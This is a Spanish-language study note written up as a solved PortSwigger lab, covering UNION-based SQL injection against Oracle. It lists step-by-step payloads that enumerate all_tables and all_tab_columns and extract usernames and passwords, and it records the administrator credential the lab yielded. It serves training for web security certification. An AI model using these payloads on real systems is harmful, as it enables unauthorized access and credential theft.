---
tipo: lab
vuln: sqli
nivel: practitioner
tags: [bscp, tipo/lab, vuln/sqli, nivel/practitioner, estado/resuelto]
fase: [1-acceso]
url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
estado: resuelto
---

# SQL Injection · Lab 08 — Listing database contents on Oracle (practitioner) ✅

## Objetivo
Mostrar los contenidos (nombre de tablas, columnas y datos) de la base de datos Oracle mediante una vulnerabilidad SQL Injection en el filtro de categoría de productos.

## Fase(s)
- 1-acceso

## Pasos realizados
1. Confirmada la vulnerabilidad con `'` y determinado que la consulta original tiene **2 columnas**, la primera visible.
2. Enumerada la tabla de usuarios con:
   ```
   '+UNION SELECT table_name, NULL FROM all_tables-- 
   ```
   → `USERS_IGMJFB`.
3. Enumeradas las columnas de la tabla descubierta:
   ```
   '+UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_IGMJFB'-- 
   ```
   → `EMAIL`, `PASSWORD_TAEAON`, `USERNAME_AVCVAQ`.
4. Extraídos los valores reales de la tabla:
   - Contraseñas:
     ```
     '+UNION SELECT PASSWORD_TAEAON, NULL FROM USERS_IGMJFB-- 
     ```
   - Usuarios:
     ```
     '+UNION SELECT USERNAME_AVCVAQ, NULL FROM USERS_IGMJFB-- 
     ```
   Resultado: `administrator / npjqvk44t83kxjv344ud` (entre otras cuentas).
5. Con esas credenciales se logró iniciar sesión como administrador, completando el lab.

## Payload usado (solución real)
```
# Enumerar tabla de usuarios
'+UNION SELECT table_name, NULL FROM all_tables--

# Enumerar columnas de la tabla
'+UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_IGMJFB'--

# Obtener contraseñas
'+UNION SELECT PASSWORD_TAEAON, NULL FROM USERS_IGMJFB--

# Obtener usuarios
'+UNION SELECT USERNAME_AVCVAQ, NULL FROM USERS_IGMJFB--
```

## Qué generalizo
- **Patrón Oracle:** en bases Oracle, usar `all_tables` y `all_tab_columns` para listar tablas y columnas. Cada `SELECT` debe incluir un `FROM`; para valores constantes se puede usar la tabla dummy `dual`. La primera columna de la respuesta es la que la página muestra.

## Enlace academy
- https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
